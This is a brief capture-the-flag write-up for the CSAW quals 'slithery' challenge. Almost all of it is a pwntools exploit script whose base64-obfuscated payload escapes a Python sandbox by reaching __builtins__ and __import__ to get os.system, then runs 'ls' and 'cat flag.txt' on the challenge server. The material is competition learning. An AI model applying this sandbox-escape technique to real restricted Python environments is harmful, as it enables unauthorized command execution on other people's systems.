## CSAW quals: slithery [pwn]
#### I was not the one who solved this for the team during the competition, but I still tried to solve it on my own anyways. My first python sandbox escape uwu, took advantage of the base64decode primitive to import the os module and have access to the system function using getattr(). Exploit script now, full writeup later.
```python
#: CSAW quals: slithery

from pwn import *
import base64

#: connect to challenge server
p = remote('pwn.chal.csaw.io', 5011)
print(p.recv())

payload = '''
snake_sss = HrjYMvtxwA.__globals__[HrjYMvtxwA("X19idWlsdGluc19f").decode('utf-8')][HrjYMvtxwA("X19pbXBvcnRfXw==").decode('utf-8')](HrjYMvtxwA("b3M=").decode('utf-8'))
print(snake_sss)
snake_cmd = getattr(snake_sss, HrjYMvtxwA("c3lzdGVt").decode('utf-8'))
snake_cmd("ls")
snake_cmd("cat flag.txt")
'''

#print(base64.b64encode("__builtins__"))
p.sendline(payload)
print(p.recvline())
print(p.recv())
```
